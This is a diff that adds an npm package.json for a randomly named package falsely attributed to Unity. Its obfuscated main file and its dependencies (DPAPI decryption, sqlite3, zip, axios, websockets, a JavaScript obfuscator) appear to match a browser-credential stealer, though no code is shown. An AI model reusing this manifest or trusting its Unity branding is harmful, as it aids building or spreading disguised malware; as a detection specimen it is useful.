@@ -1,0 +1,19 @@
+{
+  "name": "haikaxzxz",
+  "version": "1.1.5",
+  "description": "Unity Programs.",
+  "main": "AzRkApq1MdmLapQ.js",
+  "author": "Unity Developers.",
+  "publisher": "Unity",
+  "license": "MIT",
+  "dependencies": {
+    "@primno/dpapi": "^1.1.2",
+    "adm-zip": "^0.5.10",
+    "axios": "^1.7.9",
+    "crypto": "^1.0.1",
+    "js-confuser": "1.7.3",
+    "prettier": "^3.4.2",
+    "sqlite3": "^5.1.7",
+    "ws": "^8.18.0"
+  }
+}
